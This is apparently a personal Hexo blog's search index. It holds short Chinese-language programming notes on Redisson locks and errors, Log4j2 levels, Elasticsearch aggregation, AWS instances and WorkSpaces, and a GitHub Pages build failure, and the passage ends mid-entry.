<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>About Github Run Failed Pages Build And Deployment</title>
    <url>/posts/705e511f/</url>
    <content><![CDATA[<h3 id="About-Github-Run-Failed-Pages-Build-And-Deployment"><a href="#About-Github-Run-Failed-Pages-Build-And-Deployment" class="headerlink" title="About Github Run Failed Pages Build And Deployment"></a>About Github Run Failed Pages Build And Deployment</h3><span id="more"></span>
<p>這篇介紹Github Run Failed Pages Build And Deployment。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用hexo clean &amp; hexo g &amp; hexo d 做佈署時，出現</span><br><span class="line">[xxx/xxx.github.io] Run failed: pages build and deployment - master (1d9df8b)</span><br><span class="line"></span><br><span class="line">build</span><br><span class="line">Failed to download action <span class="string">&#x27;https://api.github.com/repos/actions/checkout/tarball/f43a0e5ff2bd294095638e18286ca9a3d1956744&#x27;</span>. </span><br><span class="line">Error: Response status code does not indicate success: 503 (Service Unavailable).</span><br><span class="line"></span><br><span class="line">上述錯誤，原因是Github上的服務有問題造成。</span><br><span class="line">等待Github修復即可!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>AWS instance R5 Versus R5a</title>
    <url>/posts/d948bba5/</url>
    <content><![CDATA[<h3 id="Intro-AWS-instance-R5-Versus-R5a"><a href="#Intro-AWS-instance-R5-Versus-R5a" class="headerlink" title="Intro AWS instance R5 Versus R5a"></a>Intro AWS instance R5 Versus R5a</h3><span id="more"></span>
<p>這篇介紹AWS instance R5 Versus R5a。</p>
<h3 id="Versus"><a href="#Versus" class="headerlink" title="Versus"></a>Versus</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">兩者都是16個CPU</span><br><span class="line">差別在</span><br><span class="line">R5是Intel Xeon Platinum 8000 max 3.1 GHz</span><br><span class="line">R5a是AMD EPYC 7000系列處理器 2.5 GHz</span><br><span class="line"></span><br><span class="line">R5a 每小時價格相對比 R5便宜一點!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title>About ElasticSearch Composite Aggregation AfterKey</title>
    <url>/posts/9774d5f7/</url>
    <content><![CDATA[<h3 id="About-ElasticSearch-Composite-Aggregation-AfterKey"><a href="#About-ElasticSearch-Composite-Aggregation-AfterKey" class="headerlink" title="About ElasticSearch Composite Aggregation AfterKey"></a>About ElasticSearch Composite Aggregation AfterKey</h3><span id="more"></span>
<p>這篇介紹About ElasticSearch Composite Aggregation AfterKey。</p>
<h3 id="測試過程"><a href="#測試過程" class="headerlink" title="測試過程"></a>測試過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當index資料是分散在多個shards時，用CompositeAggregation</span><br><span class="line">做group by + <span class="built_in">sum</span>的功能時，發現第一次撈回來的資料不是完整</span><br><span class="line">的資料。而用AfterKey繼續撈剩下的資料時，也會有排序在前面</span><br><span class="line">的資料(包含Top10內)。</span><br><span class="line"></span><br><span class="line">作法: 用AfterKey一直往下撈，將每次撈回來的Top10資料都放入</span><br><span class="line">同個collection。</span><br><span class="line">當AfterKey沒有值時，就不用繼續往下撈。最後針對collection</span><br><span class="line">做由大到小排序。再取出前十筆，即可拿到真正的Top10資料。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>About Redis Timeout Exception</title>
    <url>/posts/16a902aa/</url>
    <content><![CDATA[<h3 id="Intro-About-Redis-Timeout-Exception"><a href="#Intro-About-Redis-Timeout-Exception" class="headerlink" title="Intro About Redis Timeout Exception"></a>Intro About Redis Timeout Exception</h3><span id="more"></span>
<p>這篇介紹About Redis Timeout Exception.</p>
<h3 id="官方文件建議"><a href="#官方文件建議" class="headerlink" title="官方文件建議"></a>官方文件建議</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">What is the cause of RedisTimeoutException?</span><br><span class="line"></span><br><span class="line">There are four main reasons:</span><br><span class="line"></span><br><span class="line">1.All netty threads are busy, leading to delays <span class="keyword">in</span> both Redis response decoding and sending commands to Redis</span><br><span class="line">2.All connections are busy</span><br><span class="line">3.Redis server takes too long to respond the request.</span><br><span class="line">4.Sync methods invocation <span class="keyword">in</span> async/reactive/rx listeners.</span><br><span class="line"></span><br><span class="line">irst try to <span class="built_in">set</span> follow values <span class="keyword">for</span> nettyThreads setting: 32, 64, 128, 256 this </span><br><span class="line">allow Redisson to get free netty thread to decode response or send <span class="built_in">command</span>. </span><br><span class="line">Next, try to increase retryInterval and/or <span class="built_in">timeout</span> to a reasonable value so that</span><br><span class="line">a <span class="built_in">command</span> can still gracefully fail without having the end user <span class="built_in">wait</span> forever.</span><br><span class="line">At the last step, try to increase connection pool setting so that Redisson can</span><br><span class="line">stand a better chance <span class="keyword">in</span> getting a free connection.</span><br><span class="line"></span><br><span class="line">Complex commands such as keys, hmget and big loops <span class="keyword">in</span> Lua scripts are more likely</span><br><span class="line">to see it than other commands. It is important to understand an operation can</span><br><span class="line">still <span class="built_in">timeout</span> despite the absence of it from the Redis slowlog. Slowlogs only</span><br><span class="line">record the time a <span class="built_in">command</span> is been processed by the Redis event loop and not</span><br><span class="line">anything before or after. Network issue may also cause this exception when a</span><br><span class="line">response is still in-flight.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>Abstract Class Versus Interface</title>
    <url>/posts/f63b504a/</url>
    <content><![CDATA[<h3 id="Abstract-Class-vs-Interface"><a href="#Abstract-Class-vs-Interface" class="headerlink" title="Abstract Class vs. Interface"></a>Abstract Class vs. Interface</h3><span id="more"></span>
<p>這篇介紹Abstract Class和Interface兩者資料結構的特性以及使用時機。</p>
<h3 id="兩者比較"><a href="#兩者比較" class="headerlink" title="兩者比較"></a>兩者比較</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Abstract Class	Interface</span><br><span class="line">可以寫方法內容	只能宣告方法</span><br><span class="line">可以有各種方法	只宣告public方法</span><br><span class="line">單一繼承		多重繼承</span><br></pre></td></tr></table></figure>

<h3 id="使用時機"><a href="#使用時機" class="headerlink" title="使用時機"></a>使用時機</h3><p>上方兩者比較除了在繼承輸給Interface之外，Abstract Class還是彈性大。<br>Abstract Class可以寫預設的方法，又可以讓子類別overwrite。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">I.  is a : 用繼承。ex:狗是一種動物</span><br><span class="line">public abstract class Animal&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">public class Dog : Animal&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">II. has a : 用介面。是一種...</span><br><span class="line">III.can <span class="keyword">do</span> : 用介面。可以....</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><p>如果無法判斷使用哪一個資料結構，建議使用Abstract Class。<br>favor defining classes over interfaces.<br>use abstract classes instead of interfaces to decouple the contract from implementations.<br>Abstract classes, if designed correctly, allow for the same degree of decoupling between contract and implementation.<br>何時使用interface呢? 當需要提供一個多功能value type</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public struct Int32 : Icomparable, IFormattable, IConvertible&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Abstract Class</tag>
        <tag>Interface</tag>
      </tags>
  </entry>
  <entry>
    <title>About Redisson Lock</title>
    <url>/posts/84f06740/</url>
    <content><![CDATA[<h3 id="About-Redisson-Lock"><a href="#About-Redisson-Lock" class="headerlink" title="About Redisson Lock"></a>About Redisson Lock</h3><span id="more"></span>
<p>這篇介紹Redisson Lock。</p>
<h3 id="Reentrant-Lock"><a href="#Reentrant-Lock" class="headerlink" title="Reentrant Lock"></a>Reentrant Lock</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock lock = redisson.getLock(<span class="string">&quot;ReentrantLock&quot;</span>);</span><br><span class="line">try&#123;</span><br><span class="line">	// 最常見的使用方法</span><br><span class="line">	lock.lock();</span><br><span class="line"></span><br><span class="line">	// 10秒自動解鎖</span><br><span class="line">	lock.lock(10, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">	// 最多等3秒，上鎖後10秒自動解鎖</span><br><span class="line">	boolean res = lock.tryLock(3, 10, TimeUnit.SECONDS);</span><br><span class="line">	<span class="keyword">if</span> (res) &#123;</span><br><span class="line">		// <span class="keyword">do</span> your business</span><br><span class="line">	&#125;</span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">	lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reentrant-Lock-with-Async"><a href="#Reentrant-Lock-with-Async" class="headerlink" title="Reentrant Lock with Async"></a>Reentrant Lock with Async</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock lock = redisson.getLock(<span class="string">&quot;ReentrantLock&quot;</span>);</span><br><span class="line">try&#123;</span><br><span class="line">	lock.lockAsync();</span><br><span class="line">	lock.lockAsync(10, TimeUnit.SECONDS);</span><br><span class="line">	Future&lt;Boolean&gt; res = lock.tryLockAsync(3, 10, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(res.get())&#123;</span><br><span class="line">		// <span class="keyword">do</span> your business</span><br><span class="line">	&#125;</span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; catch (ExecutionException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">	lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Fair-Lock"><a href="#Fair-Lock" class="headerlink" title="Fair Lock"></a>Fair Lock</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock fairLock = redisson.getFairLock(<span class="string">&quot;FairLock&quot;</span>);</span><br><span class="line">try&#123;</span><br><span class="line">	// 最常見的使用方法</span><br><span class="line">	fairLock.lock();</span><br><span class="line"></span><br><span class="line">	// 10秒自動解鎖</span><br><span class="line">	fairLock.lock(10, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">	// 最多等10秒，上鎖後100秒自動解鎖</span><br><span class="line">	boolean res = fairLock.tryLock(10, 100, TimeUnit.SECONDS);</span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">	fairLock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Fair-Lock-with-Async"><a href="#Fair-Lock-with-Async" class="headerlink" title="Fair Lock with Async"></a>Fair Lock with Async</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock fairLock = redisson.getFairLock(<span class="string">&quot;FairLock&quot;</span>);</span><br><span class="line">fairLock.lockAsync();</span><br><span class="line">fairLock.lockAsync(10, TimeUnit.SECONDS);</span><br><span class="line">Future&lt;Boolean&gt; res = fairLock.tryLockAsync(100, 10, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>

<h3 id="Multi-Lock"><a href="#Multi-Lock" class="headerlink" title="Multi Lock"></a>Multi Lock</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock lock1 = redisson1.getLock(<span class="string">&quot;lock1&quot;</span>);</span><br><span class="line">RLock lock2 = redisson2.getLock(<span class="string">&quot;lock2&quot;</span>);</span><br><span class="line">RLock lock3 = redisson3.getLock(<span class="string">&quot;lock3&quot;</span>);</span><br><span class="line"></span><br><span class="line">RedissonMultiLock lock = new RedissonMultiLock(lock1, lock2, lock3);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">	// 同時加鎖：lock1 lock2 lock3, 所有的鎖都上鎖成功才算成功。</span><br><span class="line">	lock.lock();</span><br><span class="line"></span><br><span class="line">	// 最多等10秒，上鎖後100秒自動解鎖</span><br><span class="line">	boolean res = lock.tryLock(10, 100, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">	lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Red-Lock"><a href="#Red-Lock" class="headerlink" title="Red Lock"></a>Red Lock</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RLock lock1 = redisson1.getLock(<span class="string">&quot;lock1&quot;</span>);</span><br><span class="line">RLock lock2 = redisson2.getLock(<span class="string">&quot;lock2&quot;</span>);</span><br><span class="line">RLock lock3 = redisson3.getLock(<span class="string">&quot;lock3&quot;</span>);</span><br><span class="line"></span><br><span class="line">RedissonRedLock lock = new RedissonRedLock(lock1, lock2, lock3);</span><br><span class="line">try &#123;</span><br><span class="line">	// 同時加鎖：lock1 lock2 lock3, 紅鎖在大部分節點上加鎖成功就算成功。</span><br><span class="line">	lock.lock();</span><br><span class="line"></span><br><span class="line">	// 最多等10秒，上鎖後100秒自動解鎖</span><br><span class="line">	boolean res = lock.tryLock(10, 100, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">	lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReadWriteLock"><a href="#ReadWriteLock" class="headerlink" title="ReadWriteLock"></a>ReadWriteLock</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RReadWriteLock rwlock = redisson.getLock(<span class="string">&quot;ReadWriteLock&quot;</span>);</span><br><span class="line">rwlock.readLock().lock();</span><br><span class="line">rwlock.writeLock().lock();</span><br><span class="line"></span><br><span class="line">// 10秒自動解鎖</span><br><span class="line">rwlock.readLock().lock(10, TimeUnit.SECONDS);</span><br><span class="line">rwlock.writeLock().lock(10, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">// 最多等10秒，上鎖後100秒自動解鎖</span><br><span class="line">boolean res = rwlock.readLock().tryLock(10, 100, TimeUnit.SECONDS);</span><br><span class="line">boolean res = rwlock.writeLock().tryLock(10, 100, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">rwlock.unlock();</span><br></pre></td></tr></table></figure>

<h3 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RSemaphore semaphore = redisson.getSemaphore(<span class="string">&quot;semaphore&quot;</span>);</span><br><span class="line">semaphore.acquire();</span><br><span class="line">semaphore.acquireAsync();</span><br><span class="line">semaphore.acquire(23);</span><br><span class="line">semaphore.tryAcquire();</span><br><span class="line">semaphore.tryAcquireAsync();</span><br><span class="line">semaphore.tryAcquire(23, TimeUnit.SECONDS);</span><br><span class="line">semaphore.tryAcquireAsync(23, TimeUnit.SECONDS);</span><br><span class="line">semaphore.release(10);</span><br><span class="line">semaphore.release();</span><br><span class="line">semaphore.releaseAsync();</span><br></pre></td></tr></table></figure>

<h3 id="PermitExpirableSemaphore"><a href="#PermitExpirableSemaphore" class="headerlink" title="PermitExpirableSemaphore"></a>PermitExpirableSemaphore</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RPermitExpirableSemaphore semaphore = redisson.getPermitExpirableSemaphore(<span class="string">&quot;mySemaphore&quot;</span>);</span><br><span class="line">String permitId = semaphore.acquire();</span><br><span class="line">// 有效期兩秒</span><br><span class="line">String permitId = semaphore.acquire(2, TimeUnit.SECONDS);</span><br><span class="line">semaphore.release(permitId);</span><br></pre></td></tr></table></figure>

<h3 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RCountDownLatch latch = redisson.getCountDownLatch(<span class="string">&quot;anyCountDownLatch&quot;</span>);</span><br><span class="line">latch.trySetCount(1);</span><br><span class="line">latch.await();</span><br><span class="line"></span><br><span class="line">// 在其它Thread</span><br><span class="line">RCountDownLatch latch = redisson.getCountDownLatch(<span class="string">&quot;anyCountDownLatch&quot;</span>);</span><br><span class="line">latch.countDown();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>About Log4j2 Level</title>
    <url>/posts/5013858/</url>
    <content><![CDATA[<h3 id="關於Log4j2-Level"><a href="#關於Log4j2-Level" class="headerlink" title="關於Log4j2 Level"></a>關於Log4j2 Level</h3><span id="more"></span>
<p>這篇介紹關於Log4j2 Level。</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Log4j2 Logger Level Order:</span><br><span class="line"></span><br><span class="line">高---------------------------------------低</span><br><span class="line">FETAL &gt; ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE</span><br><span class="line"></span><br><span class="line">每個Level有對應的intLevel整數值，數值越小等級越高，數值越大等級越低。</span><br><span class="line"></span><br><span class="line">Level	intValue			用途</span><br><span class="line">OFF		0					不輸出任何日誌</span><br><span class="line">FETAL	100					造成應用程式停止的日誌</span><br><span class="line">ERROR	200					造成應用程式錯誤的日誌</span><br><span class="line">WARN	300					可能導致錯誤的日誌</span><br><span class="line">INFO	400					一般資訊的日誌</span><br><span class="line">DEBUG	500					除錯資訊的日誌</span><br><span class="line">TRACE	600					更細的除錯資訊，通常用來追蹤程式流程的日誌</span><br><span class="line">ALL		Integer.MAX_VALUE	輸出所有日誌</span><br><span class="line"></span><br><span class="line">Logger輸出的等級大於等於Logger設定的等級時才會輸出訊息。</span><br></pre></td></tr></table></figure>

<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Code:</span><br><span class="line"></span><br><span class="line">Level level = log.getLevel(); // INFO</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;LEVEL name:&quot;</span> + level.name());</span><br><span class="line">System.out.println(<span class="string">&quot;LEVEL intLevel:&quot;</span> + level.intLevel());</span><br><span class="line"></span><br><span class="line">log.fatal(<span class="string">&quot;FATAL&quot;</span>); // 印出</span><br><span class="line">log.error(<span class="string">&quot;ERROR&quot;</span>); // 印出</span><br><span class="line">log.warn(<span class="string">&quot;WARN&quot;</span>);   // 印出</span><br><span class="line">log.info(<span class="string">&quot;INFO&quot;</span>);   // 印出</span><br><span class="line">log.debug(<span class="string">&quot;DEBUG&quot;</span>);</span><br><span class="line">log.trace(<span class="string">&quot;TRACE&quot;</span>);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">LEVEL name:INFO</span><br><span class="line">LEVEL intLevel:400</span><br><span class="line">FATAL</span><br><span class="line">ERROR</span><br><span class="line">WARN</span><br><span class="line">INFO</span><br><span class="line"></span><br><span class="line">memo:等級小於Info的DEBUG和TRACE不會印出</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Log4j2</category>
      </categories>
      <tags>
        <tag>Log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Amazon WorkSpaces</title>
    <url>/posts/bc378a47/</url>
    <content><![CDATA[<h2 id="Intro-Amazon-WorkSpaces"><a href="#Intro-Amazon-WorkSpaces" class="headerlink" title="Intro Amazon WorkSpaces"></a>Intro Amazon WorkSpaces</h2><span id="more"></span>
<p>Amazon WorkSpaces 是安全且受管的桌面即服務 (DaaS) 解決方案。<br>您可以使用 Amazon WorkSpaces 在幾分鐘內佈建 Windows 或 Linux 桌面，並快速地擴展，為全球工作者提供數千個桌面。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能:"></a>功能:</h2><p>Amazon WorkSpaces 提供了一種簡便的方式，為您的最終使用者提供安全且受管的雲端虛擬桌面環境體驗。<br>與傳統現場部署虛擬桌面基礎設施 (VDI) 解決方案不同之處在於，您不需要擔心採購、部署和管理複雜的環境，<br>Amazon WorkSpaces 會挑起這些重擔，並提供全受管的服務。有了 Amazon WorkSpaces，您可以交付高品質的行動桌面和應用程式給使用者自己選擇的裝置。</p>
<p>無論您是管理傳統的桌面，還是管理針對虛擬桌面基礎設施 (VDI) 而開發的現場部署解決方案，不管哪一種都需要大量的資金投入，<br>而且部署和管理工作通常都比較困難。採用以雲端為基礎的虛擬桌面環境，不需要前期投資，也不需對基礎設施進行持續管理，<br>還能夠讓您以簡單、經濟實惠的方式為您的使用者提供安全且具有豐富存取選項的桌面體驗。</p>
<h2 id="串流協定"><a href="#串流協定" class="headerlink" title="串流協定:"></a>串流協定:</h2><p>Amazon WorkSpaces 利用串流協定為使用者提供安全和高品質的體驗。這些協定可分析託管的桌上型電腦、網路和使用者裝置，<br>以選擇壓縮和解壓縮演算法 (轉碼器)，這些演算法會對使用者桌上型電腦的轉譯進行編碼，並將其以像素串流方式傳輸至使用者裝置。<br>Amazon WorkSpaces 預設併入 Teradici 的 PC-over-IP (PCoIP) 串流協定。</p>
<h2 id="使用自有授權"><a href="#使用自有授權" class="headerlink" title="使用自有授權:"></a>使用自有授權:</h2><p>您可以將現有的 Windows 10 桌面授權帶到 Amazon WorkSpaces，然後在您專屬的實體硬體上執行它們。<br>當您將現有的 Windows 授權帶到 WorkSpaces 時，相較於已包含新 Windows 授權的 WorkSpaces，<br>可以節省高達 16% (每個 WorkSpace 每月 4 USD)。若要符合資格，您的組織必須符合 Microsoft 設定的授權要求，<br>而且必須承諾每個月在指定的 AWS 區域至少執行 200 個 Amazon WorkSpaces。</p>
<h2 id="方便佈建"><a href="#方便佈建" class="headerlink" title="方便佈建:"></a>方便佈建:</h2><p>透過 Amazon WorkSpaces 佈建桌面非常方便。無論您選擇要啟動一或多個 Amazon WorkSpaces，<br>只需要選擇最符合使用者需要的服務包，以及要啟動的 Amazon WorkSpaces 數量即可。<br>Amazon WorkSpaces 佈建完成之後，使用者會收到一封電子郵件，<br>其中提供何處可下載所需的 Amazon WorkSpaces 用戶端應用程式和如何連接 Amazon WorkSpace 的指示。<br>當您不再需要特定的 Amazon WorkSpace 時，可以輕鬆刪除它。</p>
<h2 id="安全且已加密"><a href="#安全且已加密" class="headerlink" title="安全且已加密:"></a>安全且已加密:</h2><p>Amazon WorkSpaces 提供高品質的桌面體驗，協助您符合合規與安全要求，包括 HIPAA 資格和 PCI 合規。<br>使用 WorkSpaces 時，組織的資料不會發送或存放到最終使用者的裝置上。WorkSpaces 使用的 PC-over-IP (PCoIP) 遠端顯示協定為使用者提供熟悉的桌面體驗，<br>同時將資料保留在 AWS 雲端或現場部署環境中。</p>
<p>WorkSpaces 可讓您根據 IP 地址、用戶端裝置類型或透過使用數位憑證，管理哪些用戶端裝置可存取您的 WorkSpaces。<br>您可以管理對 iOS、Android、Chrome 作業系統、極簡型電腦和 WorkSpaces Web Access 用戶端的存取。<br>對於 macOS 和 Microsoft Windows 電腦，您可以使用數位憑證限制僅供信任的裝置存取 WorkSpaces。<br>您可以使用以 IP 地址為基礎的控制群組定義能夠存取 WorkSpaces 的可信任 IP 地址。</p>
<p>Amazon WorkSpaces 與 AWS Key Management Service (KMS) 整合，提供使用 KMS 客戶主金鑰 (CMK) 加密 WorkSpaces 儲存磁碟區的功能。<br>您現在可以選擇在啟動新 WorkSpace 時加密儲存磁碟機，以確保加密傳輸和靜態資料以及從磁碟區建立的快照。</p>
<h2 id="Active-Directory-和-RADIUS-整合"><a href="#Active-Directory-和-RADIUS-整合" class="headerlink" title="Active Directory 和 RADIUS 整合:"></a>Active Directory 和 RADIUS 整合:</h2><p>Amazon WorkSpaces 可讓您使用現場部署 Microsoft Active Directory 來管理 WorkSpaces 及最終使用者登入資料。<br>透過與現場部署 Active Directory 的整合，使用者便可使用自己現有的登入資料登入，<br>而您可以將群組原則套用到 WorkSpaces、使用現有工具將軟體部署到 WorkSpaces，還可以使用現有的 RADIUS 伺服器啟用 Multi-Factor Authentication (MFA)。<br>您可以透過兩種方式與現場部署 Active Directory 整合 – 建立現場部署 Active Directory 與<br>AWS Directory Service for Microsoft Active Directory (Enterprise Edition) 網域控制站之間的安全信任關係，<br>或使用 AWS Directory Service Active Directory Connector。</p>
<h2 id="持久性儲存"><a href="#持久性儲存" class="headerlink" title="持久性儲存:"></a>持久性儲存:</h2><p>根據選取的服務包，Amazon WorkSpaces 讓每個使用者可以存取 AWS 雲端中不同數量的持久性儲存 (SSD 磁碟區)。<br>使用者存放在附屬於工作空間的「使用者磁碟區」中的資料將定期自動備份至 Amazon S3。Amazon S3 的設計是為了實現 99.999999999% 的物件耐久性，讓您的使用者資料安全無虞。</p>
<p>Amazon WorkSpaces 使用者也可以使用 Amazon WorkDocs Drive。使用者藉由使用 Amazon WorkDocs Drive，就可以透過連線至其 WorkSpace 的掛載磁碟機，<br>依照需求存取其儲存在 Amazon WorkDocs 上的所有內容。使用者可以使用 Windows 檔案總管，利用右鍵功能表在 Web 用戶端中複製可共用的連結、鎖定、解除鎖定或開啟檔案。<br>Amazon WorkDocs Drive 上的所有內容會自動透過加密連線同步至 Amazon WorkDocs，以便供其他裝置使用。同步到 Amazon WorkDocs 的資料在移轉和靜態時都處於加密狀態。</p>
<h2 id="桌面、行動和-Web-Access"><a href="#桌面、行動和-Web-Access" class="headerlink" title="桌面、行動和 Web Access:"></a>桌面、行動和 Web Access:</h2><p>您可透過 Amazon WorkSpaces 用戶端應用程式從 Windows 與 Mac 電腦、Chromebooks、iPads、Fire 平板電腦以及 Android 平板電腦存取 Amazon WorkSpaces。<br>Amazon WorkSpaces 還能使用 Chrome 和 Firefox Web 瀏覽器進行存取。Amazon WorkSpaces 佈建完成之後，使用者會收到一封電子郵件，<br>其中提供何處可下載所需的 Amazon WorkSpaces 用戶端應用程式和如何連接 Amazon WorkSpace 的指示。</p>
<p>適用於 Windows、Mac 和 Chromebooks 的 Amazon WorkSpaces 用戶端應用程式可提供使用者高品質的 Windows 桌面體驗。<br>適用於 iPad、Fire 平板電腦以及 Android 平板電腦的 用戶端應用程式，可為使用者提供已針對平板電腦優化的桌面體驗。<br>使用者可以使用多點觸控手勢來顯示或隱藏螢幕鍵盤、存取以觸控方式操作的滑鼠界面，還有捲動和縮放。用拇指從螢幕左側滑動可打開滑出式控件輪盤，<br>使用者可以在這裡存取多種命令。如果使用 Fire 或 Android 平板電腦，使用者可以連接鍵盤或觸控板，<br>從平板電腦獲得和筆記型電腦一樣的使用體驗。使用 Chrome 或 Firefox 可讓使用者在任何網路上輕鬆存取 Amazon WorkSpaces，無須先下載用戶端應用程式。</p>
]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
        <tag>WorkSpaces</tag>
      </tags>
  </entry>
  <entry>
    <title>About Redisson Lua Script Error</title>
    <url>/posts/e8a1396b/</url>
    <content><![CDATA[<h3 id="About-Redisson-Lua-Script-Error"><a href="#About-Redisson-Lua-Script-Error" class="headerlink" title="About Redisson Lua Script Error"></a>About Redisson Lua Script Error</h3><span id="more"></span>
<p>這篇介紹Redisson Lua Script Error。</p>
<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Redisson套件執行一段Lua Script時，</span><br><span class="line">報RedisException : redis() <span class="built_in">command</span> arguments must </span><br><span class="line">be strings or integers...等錯誤訊息。</span><br><span class="line"></span><br><span class="line">經Trace後，問題是出在傳入的參數有缺少導致。</span><br><span class="line">錯誤Example:</span><br><span class="line">String key = <span class="string">&quot;keyPoint&quot;</span>;</span><br><span class="line">String luaScript = <span class="string">&quot; ... &quot;</span>;</span><br><span class="line">int expireTime = 30000;</span><br><span class="line">String value = <span class="string">&quot;value&quot;</span>;</span><br><span class="line"></span><br><span class="line">RScript script = RedisManager.get().getScript(new StringCodec());</span><br><span class="line"></span><br><span class="line">script.eval(RScript.Mode.READ_WRITE, luaScript, RScript.ReturnType.INTEGER,</span><br><span class="line">		Lists.newArrayList(key), expireTime);</span><br><span class="line">		</span><br><span class="line">value參數少傳進去而throw RedisException : redis() <span class="built_in">command</span> arguments must </span><br><span class="line">be strings or integers。</span><br><span class="line"></span><br><span class="line">正確example:</span><br><span class="line">String key = <span class="string">&quot;keyPoint&quot;</span>;</span><br><span class="line">String luaScript = <span class="string">&quot; ... &quot;</span>;</span><br><span class="line">int expireTime = 30000;</span><br><span class="line">String value = <span class="string">&quot;value&quot;</span>;</span><br><span class="line"></span><br><span class="line">RScript script = RedisManager.get().getScript(new StringCodec());</span><br><span class="line"></span><br><span class="line">script.eval(RScript.Mode.READ_WRITE, luaScript, RScript.ReturnType.INTEGER,</span><br><span class="line">		Lists.newArrayList(key), expireTime, value);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Lua</tag>
      </tags>
  </entry>
  <entry>
    <title>ApacheKafka-Java</title>
    <url>/posts/712577f8/</url>
